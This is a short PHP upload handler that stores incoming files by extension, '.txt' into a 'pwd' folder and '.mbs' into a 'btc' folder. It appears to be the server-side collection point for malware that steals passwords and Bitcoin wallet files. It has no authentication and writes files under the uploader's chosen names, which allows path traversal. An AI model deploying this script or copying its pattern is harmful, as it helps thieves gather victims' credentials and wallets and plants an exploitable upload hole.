<?php

	Function GetExtension($filename) 
		{
    			return end(explode(".", $filename));
  		}

    	$ppath='./pwd/';
	$bpath='./btc/'; 		
		 
	if(strcasecmp(getExtension($_FILES['data']['name']), 'txt') == 0 )

		move_uploaded_file($_FILES['data']['tmp_name'], $ppath.$_FILES['data']['name']) or die('');

	if(strcasecmp(getExtension($_FILES['data']['name']), 'mbs') == 0 )

		move_uploaded_file($_FILES['data']['tmp_name'], $bpath.$_FILES['data']['name']) or die('');


?>